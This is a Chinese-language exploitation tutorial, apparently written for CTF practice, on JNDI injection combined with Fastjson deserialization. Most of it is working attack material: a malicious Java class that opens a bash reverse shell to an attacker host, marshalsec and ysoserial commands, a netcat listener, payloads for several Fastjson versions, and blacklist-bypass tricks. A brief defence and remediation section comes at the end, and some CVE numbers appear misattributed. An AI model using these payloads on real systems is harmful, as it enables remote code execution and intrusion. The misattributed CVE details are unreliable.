# Web-Java JNDI 注入 + Fastjson 反序列化漏洞实战

## 1. JNDI 注入原理

JNDI（Java Naming and Directory Interface）是 Java 提供的命名与目录服务接口。当应用允许用户可控字符串构造恶意 JNDI 名称（如 `ldap://evil.com/Exploit`）传递给 `lookup()` 时，Java 会请求指定的 LDAP/RMI 服务并加载远程对象，导致 RCE。

```
用户可控 input
    │
    ▼
new InitialContext().lookup(input)
    │
    ▼
LDAP/RMI 响应返回远程对象引用
    │
    ▼
加载恶意类 / Factory.getObjectInstance()
    │
    ▼
Runtime.getRuntime().exec(...)  →  RCE
```

## 2. 影响范围与利用条件

| JDK 版本 | RMI 远程加载 | LDAP 远程加载 | 可用 gadget |
|---------|-------------|--------------|------------|
| JDK ≤ 7u20 / 8u113 | ✅ | ✅ | 直接 RCE |
| 8u121 - 8u191 | ❌（默认关闭） | ✅ | LDAP 路径通杀 |
| 8u191+ / 11.0.1+ | ❌ | ❌ | 需本地 gadget chain |

**常见组件**：Fastjson、Jackson（开启 defaultTyping）、XStream、Apache Dubbo、Shiro、WebLogic、JBoss、Struts2-OGNL 等。

## 3. Fastjson 反序列化基础

Fastjson 在 `JSON.parse(jsonString)` 时会解析其中的 `@type` 字段并尝试实例化该类，从而调用 setter/getter 方法，最终触发危险调用链。

```json
{
  "@type": "com.sun.rowset.JdbcRowSetImpl",
  "dataSourceName": "ldap://attacker:1389/Exploit",
  "autoCommit": true
}
```

解析过程调用链（简化）：

```
JSON.parse → JavaBeanDeserializer.deserialze
  → setter 注入：setDataSourceName("ldap://...")
  → setAutoCommit(true) 内部调用 connect()
  → InitialContext.lookup("ldap://...")
  → JNDI 加载远程类并执行
```

## 4. 工具链搭建

### 4.1 marshalsec 启动 LDAP/RMI 服务

```bash
# 下载：https://github.com/mbechler/marshalsec
# 启动 LDAP 服务，将 Exploit 类指向 HTTP 服务器
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar \
     marshalsec.jndi.LDAPRefServer \
     "http://attacker:8888/#Exploit" 1389

# 同时启动 RMI 备用（某些场景）
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar \
     marshalsec.jndi.RMIRefServer \
     "http://attacker:8888/#Exploit" 1099
```

### 4.2 恶意类 Exploit.java

```java
public class Exploit {
    public Exploit() {}
    static {
        try {
            String cmd = "bash -c $@|bash 0 echo bash -i >& /dev/tcp/attacker/443 0>&1";
            Runtime.getRuntime().exec(cmd);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
```

编译与部署：

```bash
javac Exploit.java                                # 编译出 Exploit.class
python3 -m http.server 8888                        # 提供 class 下载
nc -lvnp 443                                      # 监听反弹 shell
```

### 4.3 ysoserial（反序列化 gadget payload）

```bash
# 生成 CommonsCollections6 RCE payload（适用于本地 gadget 场景
java -jar ysoserial.jar CommonsCollections6 "bash -c {echo,YmFza...}|{base64,-d}|{bash,-i}" > payload.ser

# JRMPListener 远程加载
java -cp ysoserial.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections6 "whoami > /tmp/pwned"
```

## 5. Fastjson 典型 payload 清单

### 5.1 经典版本（≤1.2.24，CVE-2017-18349）

```json
{
  "@type": "com.sun.rowset.JdbcRowSetImpl",
  "dataSourceName": "ldap://attacker:1389/Evil",
  "autoCommit": true
}
```

### 5.2 1.2.25 - 1.2.41（黑名单绕过：TemplatesImpl）

```json
{
  "@type": "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl",
  "_bytecodes": ["yv66vgAAADIA...base64 编码的恶意 class 字节码..."],
  "_name": "evil",
  "_tfactory": { },
  "_outputProperties": { }
}
```

### 5.3 1.2.47（CVE-2019-10210，绕过 autoType 关闭）

```json
{
  "a": {
    "@type": "java.lang.Class",
    "val": "com.sun.rowset.JdbcRowSetImpl"
  },
  "b": {
    "@type": "com.sun.rowset.JdbcRowSetImpl",
    "dataSourceName": "ldap://attacker:1389/Evil",
    "autoCommit": true
  }
}
```

### 5.4 1.2.60 / 1.2.66（基于 expect 类变种）

```json
{
  "@type": "org.apache.ibatis.datasource.jndi.JndiDataSourceFactory",
  "properties": {
    "data_source": "ldap://attacker:1389/Evil"
  }
}
```

### 5.5 其他流行 gadget 类

- `com.mchange.v2.c3p0.JndiRefForwardingDataSource`
- `com.mchange.v2.c3p0.WrapperConnectionPoolDataSource`
- `org.apache.ibatis.datasource.jndi.JndiDataSourceFactory`
- `org.springframework.context.support.ClassPathXmlApplicationContext`
- `com.rometools.rome.feed.impl.EqualsBean`
- `javax.management.BadAttributeValueExpException`
- `java.security.SignedObject` + gadget chain

## 6. Bypass 技巧汇总

### 6.1 绕过黑名单（按版本迭代）

```
1. 改大小写：@Type / @TYPE / 转义符 \u0040type
2. 嵌套 JSON / Unicode 编码
3. 利用 JSON 解析器特性：key 重复、尾后逗号、转义 \n \t
4. 利用 $ref 引用前面对象
5. 利用 [ 和 { 交替组合触发不同解析路径
```

### 6.2 绕过 JDK 8u191+ 默认关闭

在新版本 JDK 下，远程 class 加载被关闭，必须依赖**本地 classpath 已存在的 gadget：

| 场景 | 利用方式 |
|------|---------|
| 存在 Tomcat（`org.apache.naming.factory.BeanFactory` | 借助 `BeanFactory` + ELProcessor |
| Groovy 存在 | `org.codehaus.groovy.runtime.ConvertedClosure` |
| Hibernate 存在 | `org.hibernate.jmx.StatisticsService` |
| CommonsBeanUtils | `PropertyUtils.copyProperties` |

### 6.3 LDAP 响应可控本地 gadget（marshalsec 之外的技巧）

```
LDAP 返回 javaSerializedData  →  反序列化本地 gadget  →  RCE
LDAP 返回 remoteLoadingUrl    →  依赖远程 classpath
```

## 7. 检测与防御

```java
// 1. fastjson 开启 safeMode（1.2.68+ 引入
ParserConfig.getGlobalInstance().setSafeMode(true);

// 2. 业务不使用 @type 动态类型
// 3. JDK 升级到 8u191+、11.0.1+、17 关闭远程类加载
// 4. 服务器禁用 ldap:// / rmi:// 协议访问外部主机
// 5. WAF/RASP 拦截 @type、`ldap://`、`rmi://`、`dnslog`
```

## 8. 实战流程

```
Step 1  发现 fastjson 使用点（POST JSON body、异常堆栈暴露版本）
Step 2  指纹探测：提交 DNSLOG @type=Inet4Address 判断是否反序列化
Step 3  识别 fastjson 版本、JDK 版本（从响应头等判断）
Step 4  选择 payload：JdbcRowSetImpl / TemplatesImpl / 其他 gadget
Step 5  部署 LDAP/RMI + HTTP server + nc 监听
Step 6  测试、提权、读 flag
Step 7  整理 Writeup
```

## 9. 修复建议

| 方案 | 效果 | 说明 |
|------|------|------|
| 升级 fastjson 到 ≥ 1.2.83，开启 safeMode | 强 | 官方推荐 |
| 业务只解析为 Map/JSONObject，不使用 @type | 中 | 需要改造代码 |
| 升级 JDK 到 8u191+ / 11.0.1+ / 17 | 中 | 关闭远程 class 加载 |
| 禁用 LDAP/RMI 协议出站访问 | 中 | 防火墙层面限制 |
| 部署 RASP / WAF | 辅助 | 拦截恶意 payload |

> 小结：Fastjson 反序列化 + JNDI 注入是 Java Web 场景最常见的漏洞组合。核心要点：**版本识别 → gadget 匹配 → 服务搭建 → payload 投递 → RCE**。反复练习 + 理解原理是关键。
